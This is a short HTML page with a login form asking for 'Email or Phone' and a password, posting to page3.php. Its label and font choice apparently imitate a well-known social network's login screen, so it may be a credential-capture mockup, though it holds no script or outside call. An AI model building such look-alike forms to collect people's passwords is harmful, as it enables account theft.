


<html>
    
    <head>
    <style>
        body {font-family:'lucida grande',tahoma,verdana,arial,sans-serif;
              background-color:#9933ff;
           overflow: hidden;
           }
        #div1 { position: fixed;
width: 300px;
height: 160px;
top: 50%;
left: 50%;
margin-top: -80px; /* Negative half of height. */
margin-left: -150px; /* Negative half of width. */
 background-color:#ff33cc;
        text-align:centre;}
        
        form {position: absolute;
            margin-left:40px;
             margin-top:20px;}
        
        
        </style>
    
    </head>

<body>
    <div id="div1">
<form action="page3.php" method="post">
Email or Phone:<br>
<input type="text" name="email" id="email1"  required autocomplete="off"><br>
Password:<br><input type="password" name="passwd" required autocomplete="off"/>
<button type="submit" >Submit</button>

</form>
</div>
</body>
</html>
